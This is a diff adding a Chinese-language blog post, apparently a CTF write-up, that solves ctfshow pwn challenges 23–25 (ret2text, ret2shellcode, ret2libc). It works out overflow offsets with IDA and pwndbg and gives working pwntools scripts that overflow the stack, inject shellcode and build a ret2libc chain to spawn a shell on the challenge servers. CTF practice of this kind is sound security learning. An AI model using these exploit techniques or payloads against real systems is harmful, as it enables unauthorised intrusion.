@@ -18,4 +18,98 @@
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>23-25 前置基础 栈溢出</title>
+    <url>/2025/08/01/23-25%20%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80%20%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h2 id="pwn23-ret2text"><a href="#pwn23-ret2text" class="headerlink" title="pwn23 - ret2text"></a>pwn23 - ret2text</h2><blockquote>
+<p>用户名为 ctfshow 密码为 123456 请使用 ssh 软件连接</p>
+<p>ssh ctfshow@题目地址 -p题目端口号</p>
+</blockquote>
+<p>循例 checksec ，为 32 位</p>
+<p><img src="/assets/image-20250729163200466.png" alt="image-20250729163200466"></p>
+<p>使用 IDA x32 打开附件并反编译</p>
+<p><img src="/assets/image-20250729163425032.png" alt="image-20250729163425032"></p>
+<p>查看 ctfshow 函数</p>
+<p><img src="/assets/image-20250729163809445.png" alt="image-20250729163809445"></p>
+<p>需要至少 66 字节数据才能触发栈溢出漏洞</p>
+<p>触发栈溢出需要覆盖返回地址，返回地址通常位于 ebp + 4</p>
+<p>由 ctfshow 函数可知：</p>
+<ol>
+<li><p>缓冲区为 58 字节，即 0x3A</p>
+</li>
+<li><p>填满 dest 后，已经到达 ebp - 0x4</p>
+<p>dest 起始于 ebp - 0x3E（62字节），大小 58 字节，所以 dest 的结束地址是 ebp - 0x4</p>
+</li>
+<li><p>再写 4 字节覆盖 ebp</p>
+</li>
+<li><p>再写 4 字节才能覆盖返回地址（ebp + 0x4）</p>
+<p>该返回地址为固定值</p>
+</li>
+</ol>
+<p>因此，总共需要 0x3A + 0x4 + 0x4 &#x3D; 0x42 即 66 字节才能控制返回地址</p>
+<p>本地测试成功：</p>
+<p><img src="/assets/image-20250729171549945.png" alt="image-20250729171549945"></p>
+<p>同理，可远程获得 flag</p>
+<p><img src="/assets/image-20250729171649249.png" alt="image-20250729171649249"></p>
+<p>python 脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">66</span></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># io = process(argv=[&#x27;./pwn&#x27;,payload])</span></span><br><span class="line"><span class="comment"># 远程</span></span><br><span class="line">ssh = ssh(host=<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, port=<span class="number">28264</span>, user=<span class="string">&#x27;ctfshow&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">remote_cmd = <span class="string">&#x27;/home/ctfshow/pwnme&#x27;</span></span><br><span class="line">io = ssh.process(argv=[remote_cmd, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250730102841867.png" alt="image-20250730102841867"></p>
+<h2 id="pwn24-ret2shellcode"><a href="#pwn24-ret2shellcode" class="headerlink" title="pwn24 - ret2shellcode"></a>pwn24 - ret2shellcode</h2><blockquote>
+<p>你可以使用 pwntools 的 shellcraft 模块来进行攻击</p>
+</blockquote>
+<p>循例 checksec，未开启 NX 保护，存在可读可写可执行的段</p>
+<p><img src="/assets/image-20250730094546761.png" alt="image-20250730094546761"></p>
+<p>python 脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># 远程</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28284</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250730104725428.png" alt="image-20250730104725428"></p>
+<h2 id="pwn25-ret2libc"><a href="#pwn25-ret2libc" class="headerlink" title="pwn25 - ret2libc"></a>pwn25 - ret2libc</h2><blockquote>
+<p>开启 NX 保护，或许可以试试 ret2libc</p>
+</blockquote>
+<p>循例 checksec，开启 NX 保护，32 位文件</p>
+<p><img src="/assets/image-20250731141454934.png" alt="image-20250731141454934"></p>
+<p>使用 IDA x32 打开，进入 ctfshow 函数，发现缓冲区仅有 0x84 字节，但 read 函数允许读取 0x100 字节，存在缓冲区溢出漏洞</p>
+<p>该函数到 ebp 的距离是 0x88，由于是 32 位程序 ，因此获得返回地址需要再加 0x4 </p>
+<p><img src="/assets/image-20250730105924306.png" alt="image-20250730105924306"></p>
+<p>当然，也可以这么获得：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow@ubuntu:~/ctfshow/pwn25$ gdb ./pwn</span><br><span class="line">pwndbg&gt; start</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250731104409257.png" alt="image-20250731104409257"></p>
+<p>先生成足够长的字符串，比如这里是生成 200 的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyclic 200</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250731104510675.png" alt="image-20250731104510675"></p>
+<p>输入 c 后将 200 个字节复制进去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
+
+<p>能发现返回 0x6261616b</p>
+<p><img src="/assets/image-20250731104629240.png" alt="image-20250731104629240"></p>
+<p>使用 cyclic 可获得栈溢出的最少字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l 0x6261616b</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20250731104745357.png" alt="image-20250731104745357"></p>
+<p>攻击思路是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取write函数地址 -&gt; 获得libc版本 -&gt; libc库搜索system函数和/bin/sh字符串地址 -&gt; 构造payload -&gt; getshell</span><br></pre></td></tr></table></figure>
+
+<p>python 脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28229</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(main)</span></span><br><span class="line"><span class="comment"># print hex(write_got)</span></span><br><span class="line"><span class="comment"># print hex(Write_plt)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;leaked write address:&quot;, hex(write_addr))</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;system:&quot;, hex(system_addr), &quot;/bin/sh:&quot;, hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(main) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload1 为什么是 <code>p32(1) + p32(write_got) + p32(4)</code> ？</p>
+<ol>
+<li>p32(1) 对应的是第一个参数，1 表示标准输出 stdout</li>
+<li>p32(write_got) 对应的是第二个参数，要写入的数据的地址 write@got</li>
+<li>p32(4) 对应第三个参数，在 32位（x86）架构 下，内存地址是 4 字节（32 bit），因此，需要 write 输出 4 字节，才能完整读取 write@got 里的内容。</li>
+</ol>
+<p><img src="/assets/image-20250731140638753.png" alt="image-20250731140638753"></p>
+<p>成功获得 flag</p>
+<p><img src="/assets/image-20250731141353213.png" alt="image-20250731141353213"></p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
 </search>
